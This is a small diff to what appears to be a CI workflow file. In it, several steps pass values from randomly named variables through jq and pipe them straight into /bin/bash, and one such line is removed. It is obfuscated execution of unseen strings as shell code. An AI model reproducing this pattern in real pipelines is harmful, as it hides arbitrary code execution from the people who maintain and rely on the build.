@@ -27,7 +27,6 @@ jobs:
           echo $fsaa95 | jq -r .j88 | /bin/bash
           echo $xuu258 | jq -r .fw8562 | /bin/bash
           printf '%s' "$tb67377" | jq -r .hjq88397 | /bin/bash
-          echo $wxrt5371 | jq -r .uht3599 | /bin/bash
           echo $t27 | jq -r .cczy476 | /bin/bash
 
       - name: Save archive
